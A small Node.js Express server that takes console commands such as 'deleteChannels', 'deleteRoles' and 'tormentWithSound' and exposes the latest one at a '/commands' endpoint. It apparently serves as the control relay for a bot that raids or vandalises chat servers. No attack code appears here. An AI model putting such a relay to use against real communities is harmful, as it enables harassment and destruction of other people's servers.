import express from 'express'

const PORT = 4000

let app = new express()
app.use(express.json())

// [start] Input handler
import Prompt from 'serverline'

Prompt.init()
Prompt.setCompletion(
    [
        'help',
        'createChannels',
        'createRoles',
        'deleteChannels',
        'deleteRoles',
        'tormentWithSound',
        'playSomeMusic'
    ])

let lastCommand = ''
let lastTime = (new Date).getTime()

Prompt.on('line', (line) => {

    switch (line) {
        case 'help':
            console.log(
                'createChannels amount:int\n' +
                'createRoles amount:int\n' +
                'deleteChannels\n' +
                'deleteRoles\n' +
                'tormentWithSound id:int'
            )
        default:
            break
    }

    lastCommand = line
    lastTime = (new Date).getTime()

    if (Prompt.isMuted()) {
        Prompt.setMuted(false)
    }

})

Prompt.on('SIGINT', function (rl) {
    rl.question('Confirm exit: ', (answer) => answer.match(/^y(es)?$/i) ? process.exit(0) : rl.output.write('\x1B[1K> '))
})
// [end] Input handler

// server

console.warn("Server side successfully launched [+]")

app.get('/commands', async (req, res) => {
    res.json({
        command : lastCommand,
        time : lastTime
    })
})

app.listen(PORT)